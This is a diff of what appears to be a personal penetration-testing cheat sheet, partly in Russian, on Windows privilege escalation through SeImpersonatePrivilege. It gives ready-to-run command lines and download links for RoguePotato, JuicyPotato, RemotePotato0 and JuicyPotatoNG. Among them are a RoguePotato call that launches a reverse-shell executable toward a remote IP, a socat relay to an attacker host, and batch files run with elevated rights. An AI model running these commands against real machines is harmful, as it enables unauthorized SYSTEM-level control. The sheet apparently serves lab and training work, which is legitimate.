@@ -197,7 +197,8 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
 
 
-# JuicyPotato (SeImpersonatePrivilege)
+# SeImpersonatePrivilege
+    JuicyPotato ()
 
 https://github.com/ohpe/juicy-potato/releases
 
@@ -206,13 +207,18 @@ http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/
 .\JuicyPotato.exe -t * -p C:\users\userpool\desktop\start.bat -l 1338 -c '{d20a3293-3341-4ae8-9aaf-8e397cb63c34}'
 
 
-# Remoute Potato
+     remoute Potato
 
 sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999  (10.10.11.231 -сервер)
 
 .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.94 -p 9999        (Запускается на сервере - можноо первым он подскажет команду socat)
 
+    Jouice potato NG
 
+    https://github.com/antonioCoco/JuicyPotatoNG/releases
+
+    .\jp.exe -t * -p c:\programdata\cmd.bat
+    
 # Подсказки для виндовс
 
 # https://github.com/davidbombal/Ethical-Hacking/blob/main/Windows%20Pentesting%20with%20OffSec
